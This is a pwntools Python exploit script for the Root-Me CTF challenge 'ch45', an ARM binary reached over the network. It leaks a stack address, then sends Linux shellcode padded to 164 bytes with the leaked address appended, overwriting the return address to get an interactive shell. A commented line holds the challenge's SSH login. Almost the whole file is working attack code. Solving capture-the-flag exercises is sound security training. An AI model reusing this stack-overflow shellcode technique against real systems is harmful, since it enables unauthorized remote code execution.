from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'ch45'
# elf = ELF(program,checksec=False)
lokal = False
context.arch = 'arm'

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
	xp = process(["qemu-arm",program])
    #libc = elf.libc
else:
    host = 'challenge04.root-me.org'
    port = '61045'
    xp = remote(host,port)
    # ssha = ssh("app-systeme-ch45","challenge04.root-me.org",port=2224,password="app-systeme-ch45")
    # xp = ssha.run("./ch45")
	#libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    xp = process(["qemu-arm","-g","1234",program])
	#open gdb-multiarch -q program
	#target remote :1234
    cmd = ""
    # gdb.attach(xp,cmd)

#Exploit Here
#leak stack
sla("dump:\n","AAAA")
leak = int(xp.recv(10),16)
print hex(leak)

sh = asm(shellcraft.linux.sh())

sla("n):\n","y")
p = sh
p = p.ljust(164,"\x90")
p += p32(leak)

sla("dump:\n",p)

xp.interactive()
